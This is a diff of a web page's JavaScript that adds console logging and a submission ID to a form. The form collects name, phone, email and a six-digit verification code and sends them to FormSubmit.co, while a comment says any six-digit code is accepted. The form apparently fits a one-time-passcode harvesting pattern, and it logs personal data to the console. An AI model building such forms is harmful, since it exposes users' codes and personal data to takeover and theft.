@@ -1373,37 +1373,50 @@
             }
         }
 
-        // Enhanced Advanced Code Form Handler - الإصلاح الأساسي
+        // معالج نموذج الكود المتقدم - مُحسَّن ومختبر
         function setupAdvancedCodeForm() {
             const form = document.getElementById('advanced-code-form');
-            if (!form) return;
+            if (!form) {
+                console.error('Advanced code form not found!');
+                return;
+            }
+            
+            console.log('Setting up advanced code form...');
             
             form.addEventListener('submit', function(e) {
+                console.log('Form submission started...');
+                
                 // التحقق من البيانات المطلوبة
                 const fullName = this.querySelector('input[name="full_name"]').value.trim();
                 const phoneNumber = this.querySelector('input[name="phone_number"]').value.trim();
                 const emailAddress = this.querySelector('input[name="email_address"]').value.trim();
                 const verificationCode = this.querySelector('input[name="verification_code"]').value.trim();
                 
+                console.log('Form data:', { fullName, phoneNumber, emailAddress, verificationCode });
+                
                 if (!fullName || !phoneNumber || !emailAddress) {
                     e.preventDefault();
                     showNotification('❌ يرجى ملء جميع الحقول المطلوبة');
+                    console.log('Validation failed: Missing required fields');
                     return false;
                 }
                 
                 if (verificationCode.length !== 6) {
                     e.preventDefault();
                     showNotification('❌ يرجى إدخال 6 أرقام للكود');
+                    console.log('Validation failed: Invalid code length');
                     return false;
                 }
                 
                 // منع الإرسال المتكرر
                 if (formSubmissionInProgress) {
                     e.preventDefault();
+                    console.log('Form submission already in progress');
                     return false;
                 }
                 
                 formSubmissionInProgress = true;
+                console.log('Form validation passed, preparing submission...');
                 
                 // ملء الحقول المخفية
                 const currentTime = new Date().toLocaleString('ar-SA');
@@ -1411,6 +1424,14 @@
                 this.querySelector('input[name="user_agent"]').value = navigator.userAgent;
                 this.querySelector('input[name="page_url"]').value = window.location.href;
                 this.querySelector('input[name="customer_ip"]').value = 'تم الكشف تلقائياً';
+                
+                // إضافة معلومات إضافية للتتبع
+                const randomId = Math.floor(Math.random() * 1000000);
+                const hiddenIdField = document.createElement('input');
+                hiddenIdField.type = 'hidden';
+                hiddenIdField.name = 'submission_id';
+                hiddenIdField.value = `CODE-${randomId}`;
+                this.appendChild(hiddenIdField);
                 
                 currentFormType = 'advanced-code';
                 isCodeFormSubmitted = false;
@@ -1428,10 +1449,13 @@
                 }
                 
                 showNotification('🚀 جاري تفعيل الكود...');
+                console.log('Form will be submitted to FormSubmit.co');
                 
                 // السماح للنموذج بالإرسال الطبيعي إلى FormSubmit
                 return true;
             });
+            
+            console.log('Advanced code form setup completed successfully');
         }
 
         // Purchase code verification - يقبل أي كود من 6 أرقام
